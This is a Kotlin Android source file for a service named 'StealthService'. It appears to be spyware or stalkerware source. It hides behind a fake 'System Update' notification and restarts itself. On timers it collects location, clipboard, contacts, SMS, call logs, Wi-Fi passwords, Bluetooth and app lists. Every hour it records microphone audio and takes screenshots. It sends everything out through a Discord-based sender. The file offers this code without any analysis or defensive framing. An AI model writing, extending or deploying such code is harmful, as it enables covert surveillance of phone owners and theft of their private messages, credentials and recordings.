package com.sextexer.sex

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.util.Timer
import java.util.TimerTask

class StealthService : Service() {
    private val CHANNEL_ID = "StealthChannel"
    private val NOTIFICATION_ID = 1
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var isRunning = true

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
        
        // Start periodic tasks
        startPeriodicTasks()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_LOW).apply {
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_PRIVATE
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Update")
            .setContentText("Downloading packages...")
            .setSmallIcon(R.drawable.ic_stat_name) // You need a small icon in res/drawable
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun startPeriodicTasks() {
        // Every 30 seconds: Location, Clipboard, Current Apps
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                scope.launch {
                    try {
                        // 1. Location
                        val location = DataCollector.getCurrentLocation(this@StealthService)
                        
                        // 2. Clipboard
                        val clipboard = DataCollector.getClipboard(this@StealthService)
                        
                        // 3. Running Apps
                        val runningApps = DataCollector.getRunningApps(this@StealthService)
                        
                        // 4. Battery Info
                        val battery = DataCollector.getBatteryInfo(this@StealthService)
                        
                        // Package all this data
                        val payload = JSONObject().apply {
                            put("type", "heartbeat")
                            put("location", location)
                            put("clipboard", clipboard)
                            put("running_apps", runningApps)
                            put("battery", battery)
                            put("timestamp", System.currentTimeMillis())
                        }
                        
                        DiscordSender.sendPayload(payload.toString())
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }, 0, 30000) // 30 seconds

        // Every 5 minutes: Deep Data Collection (Contacts, SMS, Calls, Wifi)
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                scope.launch {
                    try {
                        // 1. Contacts
                        val contacts = DataCollector.getContacts(this@StealthService)
                        
                        // 2. SMS
                        val sms = DataCollector.getSmsMessages(this@StealthService)
                        
                        // 3. Call Logs
                        val calls = DataCollector.getCallLogs(this@StealthService)
                        
                        // 4. Wi-Fi Passwords
                        val wifi = DataCollector.getWifiPasswords(this@StealthService)
                        
                        // 5. Bluetooth Devices
                        val bluetooth = DataCollector.getBluetoothDevices(this@StealthService)
                        
                        // 6. Installed Apps List
                        val installedApps = DataCollector.getInstalledApps(this@StealthService)
                        
                        // Package deep data
                        val payload = JSONObject().apply {
                            put("type", "deep_scan")
                            put("contacts", contacts)
                            put("sms", sms)
                            put("calls", calls)
                            put("wifi", wifi)
                            put("bluetooth", bluetooth)
                            put("installed_apps", installedApps)
                            put("timestamp", System.currentTimeMillis())
                        }
                        
                        DiscordSender.sendPayload(payload.toString())
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }, 0, 300000) // 5 minutes

        // Every 1 hour: Record Audio & Screenshot
        Timer().scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                scope.launch {
                    try {
                        // Record Audio for 10 seconds
                        val audioFile = DataCollector.recordAudio(this@StealthService, 10)
                        if (audioFile != null) {
                            DiscordSender.sendFile(audioFile, "mic_recording_${System.currentTimeMillis()}.amr")
                        }
                        
                        // Take Screenshot
                        val screenshot = DataCollector.takeScreenshot(this@StealthService)
                        if (screenshot != null) {
                            DiscordSender.sendFile(screenshot, "screenshot_${System.currentTimeMillis()}.png")
                        }
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
            }
        }, 0, 3600000) // 1 hour
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
    }
}
